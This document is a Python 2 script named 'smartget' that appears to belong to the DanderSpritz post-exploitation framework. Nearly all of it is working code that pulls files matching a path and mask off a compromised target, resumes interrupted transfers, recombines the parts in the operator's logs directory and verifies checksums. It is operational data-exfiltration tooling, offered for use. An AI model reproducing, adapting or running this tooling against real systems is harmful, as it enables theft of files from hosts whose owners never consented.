
import dsz, dsz.lp, dsz.file
import os, sys, stat, time
import pickle
from optparse import OptionParser
from Utils import getutils

class smartget:

    def __init__(self, options=None):
        self.options = options
        self.path = ''
        self.mask = ''
        if self.options:
            self.path = self.options.path
            self.mask = self.options.mask
        self.localPath = str(dsz.lp.GetLogsDirectory()).strip()
        self.localFile = ''
        self.getFile = ''
        self.targetPath = ''
        self.targetSize = ''
        self.parts = {}

    def set_mask(self, mask):
        self.mask = mask

    def set_path(self, path):
        self.path = path

    def main(self):
        tempName = ''
        self.parts = self.checkParts()
        if ((len(self.parts) == 0) and self.path and self.mask):
            (targetFiles, totalSize) = getutils.dirList(self.mask, self.path)
            if (len(targetFiles) == 0):
                print 'Can not find target file'
                return False
            elif (len(targetFiles) > 1):
                answer = dsz.ui.Prompt(('Download %d files - Total Size %d bytes?' % (len(targetFiles), totalSize)), True)
                if (not answer):
                    return False
            for (targetFile, size) in targetFiles:
                self.parts[targetFile] = []
                self.parts[targetFile].append(('%s' % str(size)))
            self.writePart()
        while (len(self.parts) > 0):
            part = self.parts.keys()[0]
            print part
            if (len(self.parts[part]) > 1):
                print 'Resuming download'
                self.resumePart(part)
            else:
                print 'Starting new get'
                self.get(part)
        try:
            os.remove(('%s\\GetFiles\\parts.txt' % self.localPath))
        except:
            pass
        return True

    def checkParts(self):
        tmp = {}
        if (not os.path.exists(('%s\\GetFiles\\parts.txt' % self.localPath))):
            return tmp
        else:
            f = open(('%s\\GetFiles\\parts.txt' % self.localPath), 'rb')
            tmp = pickle.load(f)
            f.close()
            return tmp

    def startNew(self):
        self.safePrint('First time running smartget...')
        self.localFile = dsz.ui.GetString('Enter partial downloaded file:', defaultValue='')
        if ((not self.localFile) or (not os.path.exists(self.localFile))):
            self.safePrint('Local file does not exist...')
            return True
        self.getFile = dsz.ui.GetString('Enter path of file to get:', defaultValue='')
        if (not self.getFile):
            print 'Please provide a file to get'
            return False
        self.parts[self.getFile] = []
        dirCmd = ('dir %s' % self.getFile)
        if dsz.cmd.Run(dirCmd, dsz.RUN_FLAG_RECORD):
            size = ''
            try:
                dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
                [size] = dsz.cmd.data.Get('diritem::fileitem::size', dsz.TYPE_INT)
                [self.targetPath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
            except:
                self.safePrint('Could not find file')
                return True
            size = int(size)
            self.parts[self.getFile].append(('%s' % str(size)))
            self.parts[self.getFile].append(('%s' % self.localFile.split('\\')[(-1)]))
            self.writePart()
            self.targetSize = int(size)
            self.safePrint('File Exists...Starting SYNC\n')

    def resumePart(self, part):
        self.targetPath = part[:part.rfind('\\')]
        self.localFile = self.parts[part][1]
        localSize = self.makeGetCmd(self.parts[part][1:])
        if (not localSize):
            del self.parts[part]
            self.writePart()
            self.safePrint('Exiting...')
            return False
        self.targetSize = self.parts[part][0]
        print 'Resuming Download:'
        print ('\tTarget Path:\t%s' % self.targetPath)
        print ('\tTarget Size:\t%s' % self.targetSize)
        print ('\tLocal File:\t%s' % self.localFile)
        print ('\tBytes Downloaded:\t%s' % localSize)
        tmpName = getutils.trybaseget(part, start=localSize, name='tmpget', background=True)
        if tmpName:
            self.safePrint(('TMPNAME: %s' % tmpName))
            self.parts[part].append(tmpName)
            self.writePart()
            self.watchGet()
            self.combineParts(part)
            self.checksum(part)
            del self.parts[part]
            self.writePart()
        else:
            self.safePrint('Error getting file...')
            del self.parts[part]
            self.writePart()

    def get(self, part):
        tmpName = getutils.trybaseget(part, background=True)
        if tmpName:
            dsz.Sleep(2000)
            self.safePrint(('TMPNAME: %s' % tmpName))
            self.parts[part].append(tmpName)
            self.writePart()
            self.watchGet()
            del self.parts[part]
            self.writePart()
            print 'Get finished!'
        else:
            self.safePrint('Error getting file...')
            del self.parts[part]
            self.writePart()

    def watchGet(self):
        [isRunning] = dsz.cmd.data.Get('CommandMetaData::IsRunning', dsz.TYPE_BOOL)
        while (isRunning == 1):
            dsz.Sleep(5000)
            [isRunning] = dsz.cmd.data.Get('CommandMetaData::IsRunning', dsz.TYPE_BOOL)

    def writePart(self):
        if (not os.path.exists(('%s\\GetFiles' % self.localPath))):
            os.mkdir(('%s\\GetFiles' % self.localPath))
        f = open(('%s\\GetFiles\\parts.txt' % self.localPath), 'wb')
        pickle.dump(self.parts, f)
        f.close()

    def readPart(self, part):
        if (not os.path.exists(('%s\\GetFiles\\%s' % (self.localPath, part)))):
            self.safePrint(('Part does not exist: %s' % part))
            return False
        f = open(('%s\\GetFiles\\%s' % (self.localPath, part)), 'rb')
        data = f.read()
        f.close()
        return data

    def checksum(self, part):
        self.safePrint('Comparing hashes')
        checksum_cmd = ('checksum %s %s\\GetFiles %s %s' % (self.localFile.split('\\')[(-1)], self.localPath, part.split('\\')[(-1)], self.targetPath))
        if dsz.cmd.Run(checksum_cmd, dsz.RUN_FLAG_RECORD):
            self.safePrint('Hashes match!')
            return True
        else:
            self.safePrint('Hash mismatch')
            return False

    def combineParts(self, f):
        outFile = ('%s\\GetFiles\\%s' % (self.localPath, self.parts[f][1]))
        self.safePrint(('Original File: %s' % outFile))
        outputData = ''
        os.chmod(outFile, stat.S_IWRITE)
        f1 = open(outFile, 'ab')
        for part in self.parts[f][2:]:
            part = part.strip()
            self.safePrint(('PART: %s' % part))
            tmpFile = ('%s\\GetFiles\\%s' % (self.localPath, part))
            if (not os.path.exists(('%s\\GetFiles\\%s' % (self.localPath, part)))):
                self.safePrint(('Part does not exist: %s' % part))
                return False
            self.safePrint(('Making %s Writeable' % part))
            os.chmod(tmpFile, stat.S_IWRITE)
            tmpData = self.readPart(part)
            if (not tmpData):
                return False
            outputData += tmpData
            os.remove(tmpFile)
        f1.write(outputData)
        f1.close()
        os.chmod(outFile, stat.S_IREAD)
        self.safePrint('\n## File has been combined successfully! ##')
        return True

    def makeGetCmd(self, parts):
        localSize = 0
        for part in parts:
            tmpSize = int(os.stat(('%s\\GetFiles\\%s' % (self.localPath, part))).st_size)
            localSize += tmpSize
            print ('Part: %s - Size: %d' % (part, tmpSize))
        if (self.targetSize == localSize):
            self.safePrint('File sizes are the same...returning')
            return False
        return localSize

    def safePrint(self, strInput):
        dsz.ui.Echo(strInput)

def parseArgs():
    usage = 'smartget\n\t-p PATH\t\t\tSets the path for files to get\n\t-m MASK\t\t\tSets the file mask for files to get\n\t-R\t\t\t\tResumes downloads\n\t\n\t#Smartget used to download files\n\tsmartget -p C:\\path\\to\\files -m *.xml\n\t\n\t#Smartget used to resume a download\n\tsmartget -R\n\t\n\t#Alias for DSZ\n\taliases -add -alias smartget -replace "python windows/smartget.py -args \\"%cmd_args%\\""\n'
    parser = OptionParser(usage=usage)
    parser.add_option('-p', dest='path', type='string', action='store', default=None)
    parser.add_option('-m', dest='mask', type='string', action='store', default=None)
    parser.add_option('-R', dest='resume', action='store_true', default=False)
    (options, args) = parser.parse_args(sys.argv)
    if ((not options.resume) and ((not options.path) or (not options.mask))):
        print 'A path and mask are required or resume must be selected'
        print usage
        return False
    if (options.resume and (options.path or options.mask)):
        print 'Can not provide a mask or path with the resume option'
        return False
    smartget(options).main()
if (__name__ == '__main__'):
    parseArgs()